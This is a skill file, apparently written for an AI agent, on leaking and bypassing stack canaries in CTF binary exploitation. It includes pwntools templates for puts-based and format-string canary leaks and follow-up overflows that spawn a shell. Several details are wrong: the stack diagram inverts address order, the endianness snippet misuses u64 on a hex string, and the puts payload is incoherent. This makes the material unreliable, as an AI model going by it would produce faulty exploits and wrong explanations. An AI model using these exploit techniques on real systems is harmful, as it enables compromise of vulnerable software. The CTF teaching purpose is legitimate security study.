---
name: stack-canary-bypass
description: How to leak and bypass stack canary protections in binary exploitation challenges. Use this skill whenever the user mentions stack canaries, stack protector, __stack_chk_fail, CTF challenges with canary protection, or needs to exfiltrate canary values through puts/format strings. This skill covers techniques like leaking canaries via puts on overflowed stack, format string arbitrary reads, and crafting follow-up exploits once the canary is known.
---

# Stack Canary Bypass Techniques

Stack canaries (also called stack protectors) are a security mechanism that places a random value between local variables and the saved return address. When a function returns, the canary is checked—if it's been modified, the program calls `__stack_chk_fail` and terminates.

This skill covers techniques to **leak** and **bypass** stack canaries in CTF challenges and binary exploitation scenarios.

## Understanding Stack Canaries

### Key Properties
- **First byte is always null** (`\x00`) - this is critical for exploitation
- **Random value** generated at program startup
- **Location**: Between local buffer and saved return address on the stack
- **Check happens**: Before function epilogue (before `ret`)

### Stack Layout (typical)
```
[higher addresses]
  local variables
  buffer (vulnerable to overflow)
  ↓
  CANARY (8 bytes on x64, 4 bytes on x32)
  ↓
  saved frame pointer (x64 only)
  ↓
  saved return address
[lower addresses]
```

## Technique 1: Leaking Canary via `puts` on Stack

### When This Works
- Program has a **stack overflow vulnerability**
- Program can **call `puts`** (or similar print function) with a pointer into your overflowed payload
- You can **send two payloads in the same session** (one to leak, one to exploit)

### The Exploit Flow

1. **First payload**: Overflow the buffer up to (but not including) the first null byte of the canary
2. **Call `puts`** on a pointer within your payload that points to the canary location
3. **Read the output** - you'll get the canary value (minus the leading null byte)
4. **Second payload**: Use the leaked canary to craft a proper overflow that preserves it
5. **Execute your real exploit** (ROP chain, shellcode, etc.)

### Why It Works
The canary's first byte is `\x00`, which terminates C strings. When `puts` reads from the stack:
- It starts at your chosen offset
- Reads until it hits the null byte at the canary's start
- Outputs all bytes in between (the canary minus the first byte)

### Example CTF: CSAW Quals 2017 - svc
- **Architecture**: 64-bit, ASLR enabled, no PIE
- **Exploit steps**:
  1. Fill overflow until the `0x00` byte of the canary
  2. Call `puts` to leak the canary
  3. With the canary, create ROP gadget to leak `puts` address from GOT
  4. Calculate libc base, find `system` and `/bin/sh`
  5. ROP chain to call `system('/bin/sh')`

### Example CTF: hxp CTF 2018 - poorCanary
- **Architecture**: 32-bit ARM, no relro, canary, NX, no PIE
- **Exploit steps**:
  1. Overflow with call to `puts` on the overflowed buffer to leak canary
  2. ret2lib calling `system` with ROP chain:
     - `pop r0` (argument `/bin/sh`)
     - `pc` (address of `system`)

## Technique 2: Leaking Canary via Format String Arbitrary Read

### When This Works
- Program has a **format string vulnerability** (e.g., `printf(user_input)`)
- You can control format specifiers like `%x`, `%p`, `%s`
- The canary is on the stack and accessible via format string arguments

### The Exploit Flow

1. **Determine the offset** where the canary appears in the format string argument list
2. **Use `%p` or `%x`** to read that stack position
3. **Extract the canary value** from the output
4. **Craft exploit** with the correct canary value

### Finding the Canary Offset

Try incrementing the format specifier:
```
%1$p %2$p %3$p ... %20$p
```

Look for a value that:
- Ends with `00` (the null byte, though it may not print)
- Appears to be random (not a code address or common value)
- Is in a reasonable stack location

### Example CTF: ASIS CTF 2017 - MaryMorton
- **Vulnerability**: Simple format string abuse
- **Exploit**: Read the canary directly from the stack using format string specifiers
- **Follow-up**: Use the canary in a subsequent overflow to gain code execution

## Practical Exploitation Workflow

### Step 1: Identify the Vulnerability
```python
# Check if canary is enabled
checksec binary_name
# Look for: Stack canary: yes

# Find the offset to the canary
# Use gdb to examine stack layout
(gdb) info frame
(gdb) x/20gx $rsp
```

### Step 2: Leak the Canary

**Via puts:**
```python
from pwn import *

io = process('./vuln')

# First payload: leak canary
payload = b'A' * (canary_offset - 1)  # Stop before null byte
payload += b'B' * 8  # Padding to reach puts pointer
payload += p64(puts_addr)  # Address of puts in GOT
payload += p64(main_addr)  # Return to main for second chance

io.sendline(payload)
leak = io.recvline()
# Extract canary from leak (skip first null byte)
canary = leak[1:9]  # Adjust based on actual output
```

**Via format string:**
```python
from pwn import *

io = process('./vuln')

# Find canary offset
for i in range(1, 30):
    io.sendline(f'%{i}$p')
    response = io.recvline()
    # Look for suspicious value
    
# Once found, read it
io.sendline(f'%{canary_offset}$p')
canary_hex = io.recvline()
```

### Step 3: Craft the Real Exploit
```python
# Second payload: actual exploit with correct canary
payload = b'A' * buffer_offset
payload += canary  # Include the leaked canary (with null byte)
payload += b'C' * 8  # Overwrite saved frame pointer (x64)
payload += p64(shellcode_addr)  # Your payload

io.sendline(payload)
io.interactive()
```

## Common Pitfalls

### 1. Missing the Null Byte
The canary's first byte is `\x00`. When you leak it via `puts`, you only get bytes 2-8. When crafting your exploit, you must include the null byte:
```python
# WRONG - missing null byte
canary = leaked_bytes  # Only 7 bytes

# CORRECT - prepend null byte
canary = b'\x00' + leaked_bytes  # Full 8 bytes
```

### 2. Wrong Endianness
Canaries are stored in little-endian on x86/x64:
```python
# If you read the canary as hex string, convert properly
canary_hex = "deadbeef00"
canary = u64(canary_hex.encode() + b'\x00')  # Add null byte, convert
```

### 3. Session Timeout
Some programs only allow one interaction. Make sure you can:
- Leak the canary
- Send a second payload
- In the same process/session

### 4. ASLR Interactions
If ASLR is enabled:
- The canary is random per execution
- You MUST leak it at runtime
- You cannot hardcode it

## Debugging Tips

### GDB Commands
```gdb
# Find canary location
(gdb) break main
(gdb) run
(gdb) info frame
(gdb) x/20gx $rbp  # or $rsp on x64

# Watch for __stack_chk_fail
(gdb) break __stack_chk_fail
(gdb) run
(gdb) x/10gx $rsp  # Examine stack when canary check fails

# Find puts in GOT
(gdb) x/gx puts@GOT
```

### Pwntools Helpers
```python
from pwn import *

# Context setup
context.arch = 'amd64'
context.os = 'linux'

# Process with gdb for debugging
io = process('./vuln', gdb=True)

# Or use gdb context
io = process('./vuln')
gdb.attach(io, 'break main\nx/20gx $rsp')
```

## References

### CTF Writeups
- [CSAW Quals 2017 - svc](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html) - 64-bit, ASLR, no PIE
- [hxp CTF 2018 - poorCanary](https://guyinatuxedo.github.io/14-ret_2_system/hxp18_poorCanary/index.html) - 32-bit ARM
- [ASIS CTF 2017 - MaryMorton](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html) - Format string canary leak

### Additional Resources
- [Stack Canaries - ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/canaries)
- [Format String Exploitation](../../format-strings/) - For arbitrary read techniques

## Quick Reference

| Technique | Requirements | Difficulty |
|-----------|-------------|------------|
| `puts` leak | Stack overflow + puts call + 2 payloads | Medium |
| Format string | Format string vuln + stack access | Easy-Medium |
| Info leak gadget | ROP chain to leak memory | Hard |

| Check | Command |
|-------|--------|
| Canary enabled | `checksec binary` |
| Find canary offset | `gdb` + `x/20gx $rsp` |
| Leak via puts | Overflow to canary + call puts |
| Leak via format | `%n$p` to find offset |

## When to Use This Skill

Use this skill when:
- A CTF challenge has stack canary protection enabled
- You need to leak a canary value to proceed with exploitation
- You're dealing with `__stack_chk_fail` crashes
- You have a format string vulnerability and need to read stack values
- You need to understand stack protector bypass techniques

Don't use this skill for:
- Basic buffer overflows without canaries
- Heap exploitation (different protection mechanisms)
- Kernel exploitation (different canary implementations)
